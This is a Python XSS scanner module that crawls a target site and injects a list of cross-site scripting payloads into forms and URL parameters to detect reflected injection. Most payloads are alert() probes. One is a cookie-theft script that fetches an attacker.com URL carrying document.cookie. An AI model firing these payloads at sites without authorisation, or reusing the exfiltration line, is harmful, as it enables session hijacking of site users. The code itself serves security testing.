#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Cross-Site Scripting (XSS) Scanner Module.
This module implements scanning functionality to detect XSS vulnerabilities.
"""

import re
import logging
import time
import html
from typing import Dict, List, Any, Optional, Tuple, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup

from .base_scanner import BaseScanner

# Configure logging
logger = logging.getLogger('xss_scanner')

class XSSScanner(BaseScanner):
    """
    Cross-Site Scripting vulnerability scanner.
    Detects potential XSS vulnerabilities in web applications.
    """
    
    def __init__(self, url: str, **kwargs):
        """
        Initialize XSS scanner with specific XSS testing parameters.
        
        Args:
            url (str): The target URL to scan
            **kwargs: Additional arguments to pass to the base scanner
        """
        super().__init__(url, **kwargs)
        
        # XSS payloads for testing
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<a onmouseover=alert('XSS')>hover me</a>",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<div onmouseover='alert(`XSS`)'>hover me</div>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
            "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--"
            "></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "><script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>",
            "' onmouseover='alert(\"XSS\")'",
            "\" onmouseover=\"alert('XSS')\"",
            "onerror=alert('XSS') src=x",
            "<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
            "<audio src=1 href=1 onerror=\"javascript:alert('XSS')\"></audio>",
            "<video src=1 href=1 onerror=\"javascript:alert('XSS')\"></video>",
            "<body src=1 href=1 onerror=\"javascript:alert('XSS')\"></body>",
            "<image src=1 href=1 onerror=\"javascript:alert('XSS')\"></image>",
            "<object src=1 href=1 onerror=\"javascript:alert('XSS')\"></object>",
            "<script src=1 href=1 onerror=\"javascript:alert('XSS')\"></script>",
            "<svg onload=\"javascript:alert('XSS')\" xmlns=\"http://www.w3.org/2000/svg\"></svg>",
            "<svg><script>alert('XSS')</script></svg>",
            "<img src=\"javascript:alert('XSS')\">",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        ]
        
        # Initialize found URLs that contain forms or reflect input
        self.form_urls = set()
        self.reflective_urls = set()
        
        # Track already tested URLs to avoid duplicates
        self.tested_urls = set()
    
    def _extract_forms(self, url: str) -> List[Dict[str, Any]]:
        """
        Extract forms from a webpage.
        
        Args:
            url (str): URL to extract forms from
            
        Returns:
            list: List of forms with their details
        """
        response = self.make_request(url)
        if not response:
            return []
        
        forms = []
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for form in soup.find_all('form'):
            form_details = {}
            form_details['action'] = form.get('action', '')
            form_details['method'] = form.get('method', 'get').lower()
            
            # Extract input fields
            inputs = []
            for input_tag in form.find_all('input'):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name')
                input_value = input_tag.get('value', '')
                
                if input_name:  # Skip inputs without name
                    inputs.append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
            
            # Also extract textareas and selects
            for textarea in form.find_all('textarea'):
                textarea_name = textarea.get('name')
                if textarea_name:
                    inputs.append({
                        'type': 'textarea',
                        'name': textarea_name,
                        'value': textarea.get_text()
                    })
            
            for select in form.find_all('select'):
                select_name = select.get('name')
                if select_name:
                    inputs.append({
                        'type': 'select',
                        'name': select_name,
                        'value': ''
                    })
            
            form_details['inputs'] = inputs
            forms.append(form_details)
            
            # Add form URL to the list of found form URLs
            if form_details['action']:
                form_url = urljoin(url, form_details['action'])
                self.form_urls.add(form_url)
        
        return forms
    
    def _is_vulnerable_to_xss(self, response_text: str, payload: str) -> bool:
        """
        Check if a response contains an unfiltered XSS payload.
        
        Args:
            response_text (str): Response text to check
            payload (str): The payload that was injected
            
        Returns:
            bool: True if XSS vulnerability detected, False otherwise
        """
        # First check if the raw payload is in the response (most basic check)
        if payload in response_text:
            # Check if it's properly escaped using html module
            escaped_payload = html.escape(payload)
            if escaped_payload != payload and escaped_payload in response_text:
                return False  # The payload was properly escaped
            return True
        
        # For more complex cases, check if the payload structure is preserved
        # This helps detect cases where quotes might be changed but the structure remains
        soup = BeautifulSoup(response_text, 'html.parser')
        
        # Check for script tags
        if '<script>' in payload.lower() or '</script>' in payload.lower():
            if soup.find_all('script'):
                for script in soup.find_all('script'):
                    script_content = script.string if script.string else ''
                    if 'alert' in script_content and 'XSS' in script_content:
                        return True
        
        # Check for event handlers
        if 'onerror=' in payload.lower() or 'onload=' in payload.lower() or 'onmouseover=' in payload.lower():
            for tag in soup.find_all(True):  # Find all tags
                for attr in tag.attrs:
                    attr_value = tag.attrs[attr]
                    if isinstance(attr_value, str) and ('alert' in attr_value and 'XSS' in attr_value):
                        return True
                    elif isinstance(attr_value, list):
                        for val in attr_value:
                            if isinstance(val, str) and ('alert' in val and 'XSS' in val):
                                return True
        
        return False
    
    def _test_form(self, url: str, form: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Test a form for XSS vulnerabilities.
        
        Args:
            url (str): URL of the page containing the form
            form (dict): Form details
            
        Returns:
            dict or None: Vulnerability details if found, None otherwise
        """
        form_action = urljoin(url, form['action']) if form['action'] else url
        
        # Skip if we've already tested this form action URL
        if form_action in self.tested_urls:
            return None
        
        self.tested_urls.add(form_action)
        
        # Track the most successful payload and the error it produced
        successful_test = None
        
        for payload in self.xss_payloads:
            # Skip testing if we already found a vulnerability in this form
            if successful_test:
                break
                
            # Log the testing progress if verbose
            if self.verbose:
                logger.debug(f"Testing form at {form_action} with payload: {payload}")
            
            # Prepare form data with the XSS payload
            data = {}
            
            # Find the most likely fields to inject into (text inputs, search fields, etc.)
            injectable_inputs = [
                input_field for input_field in form['inputs']
                if input_field['type'] in ['text', 'search', 'url', 'textarea', 'email', 'hidden']
            ]
            
            # If no injectable inputs found, try all inputs
            if not injectable_inputs:
                injectable_inputs = form['inputs']
            
            # Skip if no inputs to test
            if not injectable_inputs:
                continue
            
            # Add all form inputs to the data
            for input_field in form['inputs']:
                if input_field['type'] != 'submit':
                    if input_field in injectable_inputs:
                        # Inject the payload
                        data[input_field['name']] = payload
                    else:
                        # Keep original value for non-injectable fields
                        data[input_field['name']] = input_field['value']
            
            # Make the request according to the form method
            if form['method'] == 'post':
                response = self.make_request(form_action, method='POST', data=data)
            else:
                response = self.make_request(form_action, method='GET', params=data)
            
            # Check if the response was successful and contains the XSS payload
            if response and self._is_vulnerable_to_xss(response.text, payload):
                # Found a vulnerability
                vulnerable_input = next((i['name'] for i in injectable_inputs), 'unknown_field')
                successful_test = {
                    'url': form_action,
                    'method': form['method'].upper(),
                    'payload': payload,
                    'field': vulnerable_input,
                    'details': f"Injected '{payload}' into field '{vulnerable_input}' using {form['method'].upper()}"
                }
        
        # If we found a vulnerability, return it
        if successful_test:
            return successful_test
        
        return None
    
    def _test_url_parameters(self, url: str) -> Optional[Dict[str, Any]]:
        """
        Test URL parameters for XSS vulnerabilities.
        
        Args:
            url (str): URL with parameters to test
            
        Returns:
            dict or None: Vulnerability details if found, None otherwise
        """
        # Skip if we've already tested this URL
        if url in self.tested_urls:
            return None
        
        self.tested_urls.add(url)
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        # Skip if no parameters
        if not params:
            return None
        
        # Add URL to the list of found parameter URLs
        self.reflective_urls.add(url)
        
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # First, check if the URL is reflective (echoes parameters in the response)
        for param_name, param_values in params.items():
            # Create a unique test value
            test_value = f"XSSTEST{int(time.time())}"
            
            # Create modified parameters with the test value
            modified_params = params.copy()
            modified_params[param_name] = [test_value]
            
            # Encode the parameters
            query_string = urlencode(modified_params, doseq=True)
            
            # Build the full URL with the test value
            test_url = f"{base_url}?{query_string}"
            
            # Make the request
            response = self.make_request(test_url, method='GET')
            
            # Check if the response contains the test value (reflective)
            if response and test_value in response.text:
                # URL is reflective, now test for XSS
                for payload in self.xss_payloads:
                    # Log the testing progress if verbose
                    if self.verbose:
                        logger.debug(f"Testing parameter '{param_name}' at {url} with payload: {payload}")
                    
                    # Create modified parameters with the payload
                    modified_params = params.copy()
                    modified_params[param_name] = [payload]
                    
                    # Encode the parameters
                    query_string = urlencode(modified_params, doseq=True)
                    
                    # Build the full URL with the payload
                    xss_test_url = f"{base_url}?{query_string}"
                    
                    # Make the request
                    xss_response = self.make_request(xss_test_url, method='GET')
                    
                    # Check if the response contains unfiltered XSS payload
                    if xss_response and self._is_vulnerable_to_xss(xss_response.text, payload):
                        # Found a vulnerability
                        return {
                            'url': url,
                            'method': 'GET',
                            'payload': payload,
                            'parameter': param_name,
                            'details': f"Injected '{payload}' into parameter '{param_name}'"
                        }
        
        return None
    
    def _crawl_and_identify_targets(self) -> Tuple[Set[str], Set[str]]:
        """
        Perform basic crawling to identify forms and reflective pages.
        
        Returns:
            tuple: Sets of form URLs and reflective URLs
        """
        logger.info("Crawling to identify forms and reflective pages...")
        
        # Start with the target URL
        to_visit = {self.target_url}
        visited = set()
        
        # Limit the crawling depth and number of URLs
        max_urls = 20
        
        while to_visit and len(visited) < max_urls:
            current_url = to_visit.pop()
            
            if current_url in visited:
                continue
                
            visited.add(current_url)
            
            # Check if URL has parameters
            parsed_url = urlparse(current_url)
            if parsed_url.query:
                # Test if it's reflective
                params = parse_qs(parsed_url.query)
                for param_name, param_values in params.items():
                    test_value = f"XSSTEST{int(time.time())}"
                    modified_params = params.copy()
                    modified_params[param_name] = [test_value]
                    
                    query_string = urlencode(modified_params, doseq=True)
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    test_url = f"{base_url}?{query_string}"
                    
                    response = self.make_request(test_url, method='GET')
                    if response and test_value in response.text:
                        self.reflective_urls.add(current_url)
                        break
            
            # Get the page and extract forms
            response = self.make_request(current_url)
            if not response:
                continue
                
            # Parse the HTML content
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract forms
            forms = self._extract_forms(current_url)
            if forms:
                logger.debug(f"Found {len(forms)} forms on {current_url}")
            
            # Extract links for further crawling
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                
                # Skip empty links, anchors, and external links
                if not href or href.startswith('#') or href.startswith('javascript:'):
                    continue
                    
                # Convert relative URL to absolute
                link = urljoin(current_url, href)
                
                # Ensure we stay within the same domain
                if urlparse(link).netloc == urlparse(self.target_url).netloc:
                    to_visit.add(link)
        
        logger.info(f"Crawling complete. Found {len(self.form_urls)} forms and {len(self.reflective_urls)} reflective URLs")
        return self.form_urls, self.reflective_urls
    
    def scan(self) -> List[Dict[str, Any]]:
        """
        Scan for Cross-Site Scripting vulnerabilities.
        
        Returns:
            list: List of detected vulnerabilities
        """
        logger.info(f"Starting XSS scan on {self.target_url}")
        start_time = time.time()
        
        # Crawl to identify forms and reflective URLs
        form_urls, reflective_urls = self._crawl_and_identify_targets()
        
        # Test forms for XSS
        for form_url in form_urls:
            forms = self._extract_forms(form_url)
            
            for form in forms:
                vulnerability = self._test_form(form_url, form)
                
                if vulnerability:
                    # Add the vulnerability to our list
                    self.add_vulnerability(
                        vuln_type='Cross-Site Scripting (XSS)',
                        url=vulnerability['url'],
                        title='XSS in Form',
                        severity='high',
                        description='Cross-Site Scripting vulnerability found in a form input.',
                        details=vulnerability['details'],
                        recommendation='Implement proper input validation and output encoding. Use frameworks that automatically escape output. Consider implementing Content Security Policy (CSP).'
                    )
        
        # Test URL parameters for XSS
        for reflective_url in reflective_urls:
            vulnerability = self._test_url_parameters(reflective_url)
            
            if vulnerability:
                # Add the vulnerability to our list
                self.add_vulnerability(
                    vuln_type='Cross-Site Scripting (XSS)',
                    url=vulnerability['url'],
                    title='Reflected XSS in URL Parameter',
                    severity='high',
                    description='Reflected Cross-Site Scripting vulnerability found in URL parameter.',
                    details=vulnerability['details'],
                    recommendation='Implement proper input validation and output encoding. Use frameworks that automatically escape output. Consider implementing Content Security Policy (CSP).'
                )
        
        scan_duration = time.time() - start_time
        logger.info(f"XSS scan completed in {scan_duration:.2f} seconds")
        logger.info(f"Found {len(self.vulnerabilities)} XSS vulnerabilities")
        
        return self.vulnerabilities 